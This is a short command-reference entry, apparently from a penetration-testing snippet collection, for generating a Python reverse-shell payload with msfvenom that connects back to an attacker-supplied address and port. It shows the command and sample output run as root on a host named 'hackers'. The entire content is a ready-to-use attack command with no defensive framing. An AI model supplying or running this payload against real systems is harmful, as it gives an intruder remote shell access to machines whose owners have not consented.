---
id: e751126e-f03e-4a53-b526-7a7fc102762e
name: msfvenom python script reverse shell
type: command
executor: null
data: msfvenom -p cmd/unix/reverse_python LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f raw
  > msf.py
output: 'root@hackers:~# msfvenom -p cmd/unix/reverse_python LHOST=172.16.162.187
  LPORT=1337 -f raw > msf.py

  [-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload

  [-] No arch selected, selecting arch: cmd from the payload

  No encoder or badchars specified, outputting raw payload

  Payload size: 537 bytes'
created_at: '2019-09-17T16:46:08.354416+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# msfvenom python script reverse shell

```bash
msfvenom -p cmd/unix/reverse_python LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f raw > msf.py
```

## Expected Output

```
root@hackers:~# msfvenom -p cmd/unix/reverse_python LHOST=172.16.162.187 LPORT=1337 -f raw > msf.py
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 537 bytes
```
